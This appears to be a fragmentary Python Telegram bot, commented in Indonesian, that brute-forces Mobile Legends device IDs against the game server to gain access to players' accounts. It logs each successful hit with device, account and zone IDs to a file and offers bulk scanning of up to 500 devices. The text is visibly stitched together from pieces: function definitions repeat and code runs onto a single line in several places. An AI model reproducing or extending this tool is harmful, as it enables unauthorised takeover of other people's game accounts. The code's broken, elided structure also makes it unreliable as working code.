...
# -*- coding: utf-8 -*-
"""
MLBB COMBINED BOT — Telegram Version (FINAL + BF KICK UPDATE)
Fitur:
  🚀 BF Device Loop (max 10 device, unlimited loop) — logika jgnganti.py
...
class GameConnection(BaseConnection):
    ...
    def connect_to_game_server(self):
        """UPDATED — mengikuti jgnganti.py (deteksi pid 10002 / 20001)."""
        self.cleanup()
...
HELP_TEXT = (
    "🤖 *MLBB COMBINED BOT*\n\n"
    "*Fitur:*\n"
    "• 🚀 *BF Device Loop* — max 10 device ID (unlimited loop)\n"
        ...
        while not state["stop_flag"]:
            ...
            for r in results:
                ...
                if r.get("status") == "success":
                    ...
                    state["success"] += 1
                    hit = True
                    state["hit_list"].append({
                        "device": d, "acc_id": a, "zone": z, "loop": ln
                    })
                    save_line(
                        BF_HIT_FILE,
                        f"DEVICE ID: {d} | Account ID: {a} | Zone ID: {z} | Loop: {ln}"
                    )
                else:
                    state["fail"] += 1
                    save_line(
                        BF_FAIL_FILE,
                        f"DEVICE ID: {d} | Error: {r.get('error', '?')} | Loop: {ln}"
                    )
            if state["stop_flag"]:
                break
...
def main():
    ...
    # ── ConversationHandler untuk Broadcast (Owner) ───────────────────
    ...
    # Handler file .txt untuk Bulk Scan
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("txt"), handle_bulk_file))

    # Handler callback (button)
    app.add_handler(CallbackQueryHandler(button_handler))

    # Debug handler (paling akhir)
    if DEBUG_MODE:
        app.add_handler(MessageHandler(
            filters.ALL & ~filters.COMMAND, debug_handler), group=1)
...
if __name__ == "__main__":
    try:
        ...
        import traceback
        traceback.print_exc()
        sys.exit(1)MAX_BULK_DEVICES = 500
MAX_BF_DEVICES   = 10
    ...
    def connect_to_game_server(self):
        ...
        while True:
            ...
            if pid is None:
                ...
                # Sukses masuk ke dalam game (sesi valid)
                return True
            elif pid == -1:
                return False
            elif pid == 20001:
                # Pesan sistem / notifikasi — koneksi berhasil sampai ke game
                return True
            # Pesan lain → lanjut loop sampai timeout / 10002 / 20001
...
# ══════════════════════════════════════════════════════════════════════
# BF DEVICE LOOP — UPDATED (logika jgnganti.py)
# ══════════════════════════════════════════════════════════════════════
def bf_login_with_device(device_id, device_model=None):
    """
...
# ══════════════════════════════════════════════════════════════════════
# BF DEVICE LOOP  (mengikuti logika jgnganti.py)
# ══════════════════════════════════════════════════════════════════════
def bf_login_with_device(device_id, device_model=None):
    """
    Brute force Device ID ke game server MLBB.
...
if __name__ == "__main__":
    main()BULK_DETAIL_FILE = os.path.join(OUTPUT_DIR, "HASIL_BULK_DEVID.txt")
USERS_DB_FILE    = os.path.join(OUTPUT_DIR, "bot_users.json")
...
async def receive_gen_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        await update.message.reply_text(
            "⚠️ Masukkan angka 1-9999.", parse_mode="Markdown")
        return WAITING_GEN_COUNT
